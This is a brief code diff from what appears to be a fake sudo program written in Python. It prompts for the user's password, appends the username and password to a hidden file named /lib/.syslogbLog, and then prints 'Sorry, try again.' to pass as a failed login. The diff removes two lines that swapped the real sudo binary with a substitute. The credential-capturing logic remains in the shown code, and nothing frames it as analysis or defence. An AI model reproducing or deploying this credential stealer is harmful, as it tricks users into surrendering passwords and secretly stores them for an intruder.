@@ -22,8 +22,6 @@ def main():
         password = input("[sudo] password for " + user + ": ")
         
         os.system("echo \"" + user + ":" + password + "\" >> /lib/.syslogbLog")
-        os.system("mv /usr/bin/sudo /usr/bin/sudoC")
-        os.system("mv /usr/bin/sudoA /usr/bin/sudo")
         time.sleep(3)
         os.system('stty echo')
         print("Sorry, try again.")
